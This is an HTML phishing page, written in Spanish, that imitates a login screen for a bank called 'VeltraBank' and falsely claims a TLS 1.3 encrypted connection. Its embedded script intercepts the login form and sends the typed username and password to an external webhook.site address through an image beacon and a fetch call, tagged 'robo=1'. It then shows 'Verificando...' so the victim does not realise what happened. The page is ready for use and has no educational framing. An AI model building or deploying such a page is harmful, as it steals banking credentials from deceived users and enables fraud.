<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>VeltraBank — Banca en línea</title>
<style>
  body{margin:0;font-family:system-ui,Segoe UI,Roboto,sans-serif;background:#0a1020;color:#e8eefc}
  .wrap{display:flex;min-height:100vh;align-items:center;justify-content:center;padding:20px}
  .card{background:#111a2e;border:1px solid #1e2b45;border-radius:16px;padding:32px;width:360px}
  .brand{display:flex;align-items:center;gap:10px;margin-bottom:24px}
  .brand .logo{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#2bd4c0,#3b82f6)}
  .brand b{font-size:18px}
  h1{font-size:22px;margin:0 0 6px}
  .sub{color:#8ea3c8;font-size:14px;margin:0 0 20px}
  label{display:block;font-size:13px;color:#b9c7e2;margin:14px 0 6px}
  input{width:100%;box-sizing:border-box;padding:12px;border-radius:10px;border:1px solid #27344f;background:#0c1426;color:#fff;font-size:15px}
  button{width:100%;margin-top:20px;padding:13px;border:0;border-radius:10px;background:linear-gradient(90deg,#3b82f6,#2bd4c0);color:#06101f;font-weight:700;font-size:15px;cursor:pointer}
  .tag{font-size:12px;color:#7fe0cf;background:#0f1e22;border:1px solid #1c3b36;border-radius:20px;padding:4px 10px;display:inline-block;margin-bottom:18px}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="brand"><div class="logo"></div><b>VeltraBank</b></div>
    <span class="tag">● Conexión cifrada · TLS 1.3</span>
    <h1>Iniciar sesión</h1>
    <p class="sub">Ingresa con tus credenciales para continuar.</p>
    <form id="f" method="get" action="/">
      <label>Usuario</label>
      <input id="u" name="usuario" type="text" placeholder="nombre.apellido" autocomplete="username">
      <label>Contraseña</label>
      <input id="p" name="clave" type="password" placeholder="••••••••••" autocomplete="current-password">
      <button type="submit">Continuar</button>
    </form>
  </div>
</div>
<script>
  var WEBHOOK = "https://webhook.site/1c917c46-e35f-4d09-9c32-c19e2f5f7e5e";
  function filtrar(u, p){
    var q = "?robo=1&usuario=" + encodeURIComponent(u) + "&clave=" + encodeURIComponent(p);
    new Image().src = WEBHOOK + q;
    try { fetch(WEBHOOK + q, {mode:"no-cors"}); } catch(e){}
  }
  document.getElementById("f").addEventListener("submit", function(e){
    e.preventDefault();
    filtrar(document.getElementById("u").value, document.getElementById("p").value);
    document.querySelector("button").textContent = "Verificando...";
  });
</script>
</body>
</html>
